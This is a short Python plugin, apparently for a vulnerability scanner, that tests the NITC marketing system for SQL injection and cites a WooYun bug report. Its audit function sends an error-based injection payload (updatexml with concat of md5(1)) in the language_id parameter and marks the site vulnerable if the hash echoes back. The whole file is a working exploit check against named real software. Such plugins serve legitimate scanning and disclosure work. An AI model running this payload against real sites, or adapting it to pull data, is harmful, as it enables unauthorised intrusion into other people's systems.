#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:NITC营销系统SQL注入漏洞 get
#Refer:http://wooyun.org/bugs/wooyun-2015-0152825
#Author:xq17

def assign(service, arg):
    if service == "nitc":
        return True, arg

def audit(arg):
    url = arg + "index.php?language_id=1%20or%20updatexml(1,concat(0x5c,md5(1)),1)%23--&is_protect=1&action=test"
    code, head, res, errcode, _ = curl.curl2(url)
    if code!=0 and 'c4ca4238a0b923820dcc509a6f75849' in res:
        security_hole(url)

        return arg
if __name__== '__main__':
    from dummy import *
